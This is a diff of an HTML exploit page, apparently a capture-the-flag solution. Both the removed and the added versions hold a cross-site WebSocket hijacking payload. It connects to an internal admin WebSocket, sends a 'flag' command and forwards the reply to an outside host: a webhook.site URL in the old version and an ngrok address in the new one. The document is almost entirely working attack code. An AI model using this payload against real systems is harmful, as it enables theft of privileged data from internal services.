@@ -1,35 +1,20 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Exploit Page</title>
-</head>
-<body>
-    <script>
-        // Step 1: Open a WebSocket connection to the target server
-        var ws = new WebSocket("ws://web:8080/admin/ws"); // Internal server URL
 
-        // Step 2: When the connection is established, send the 'flag' command
+<html>
+
+<head>
+    <title>haha</title>
+    <script>
+        var ws = new WebSocket("ws://web:8080/admin/ws");
         ws.onopen = function() {
             ws.send("flag");
         };
-
-        // Step 3: Listen for the response (the flag) and forward it to Webhook.site via POST request
         ws.onmessage = function(event) {
-            // Replace YOUR_WEBHOOK_URL with your unique Webhook.site URL
-            fetch("https://webhook.site/e557236e-aff5-4af6-9d50-1f7c6025810d", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/x-www-form-urlencoded"
-                },
-                body: "flag=" + encodeURIComponent(event.data)
-            });
-        };
-
-        // Optional: Close WebSocket connection after receiving the message
-        ws.onclose = function() {
-            console.log("WebSocket connection closed.");
+            const xhttp = new XMLHttpRequest();
+            xhttp.open('POST', 'https://37b3-115-186-169-76.ngrok-free.app/' + event.data, true);
+            xhttp.send();
         };
     </script>
-</body>
+</head>
+
 </html>
